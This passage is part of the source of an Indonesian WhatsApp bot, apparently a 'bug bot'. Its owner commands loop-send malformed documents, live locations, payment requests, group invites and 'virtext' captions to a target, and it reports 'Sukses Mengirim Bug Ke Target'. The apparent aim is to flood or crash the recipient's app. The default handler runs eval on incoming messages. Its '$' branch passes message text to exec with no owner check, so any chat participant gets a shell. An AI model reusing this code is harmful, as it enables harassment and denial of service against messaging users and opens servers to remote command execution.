"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'lokasi': case 'lokasi3': case 'lokasi4': case 'lokasi5': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
//=================================================//
//=================================================//
// BUG OWNER
case 'payment': case 'payment2': case 'payment3': case 'payment4': case 'payment5': {
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER ʜᴡ ᴍᴏᴅꜱ ᴡᴀ`,
}
}}), { userJid: from, quoted:m})
haikal.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'pc': case 'pc2': case 'pc3': case 'pc4': case 'pc5':{
if (!isCreator) return m.reply(mess.owner)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"groupName": `MY NAME ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
m.reply(`Sukses Mengirim Bug Ke Target !!!`)
}
}
break
case 'virtext1': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext2': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone1}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext3': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone2}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext4': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone3}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext5': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone4}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext6': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone5}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext7': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${iphone6}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext8': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${buttonkal}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext9': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${buttonvirus}` }, { quoted: m })
}
}
break
//=================================================//
case 'virtext10': {
if (args.length == 0) return anjay(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/0aa0de71e866b3e9393ea.jpg' }, caption: `ʜᴡ ᴍᴏᴅꜱ ᴡᴀ${ngazap(prefix)}`}, { quoted: m })
}
}
break
case 'haikal': {
joauu = fs.readFileSync('./baseikal/video/hwmods.mp4')
haikal.sendMessage(from, { video: joauu, mimetype: 'video/mp4', caption: `APA ?? BERANI LIAT VIDEO INI GA ? AH LEMAH TAPI KHUSUS ANDROID 11 KEBAWAH DENG ` }, { quoted:m })
}
break
case 'amgeekzcoy': {
joauuu = fs.readFileSync('./baseikal/apk/amgeekz.apk')
haikal.sendMessage(from, { document: joauuu, mimetype: "application/vnd.android.package-archive", fileName: `AMGEEKZ.apk`, title:`AMGEEKZ.apk`, caption:`Apk Amgeekz ` }, { quoted:m })
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
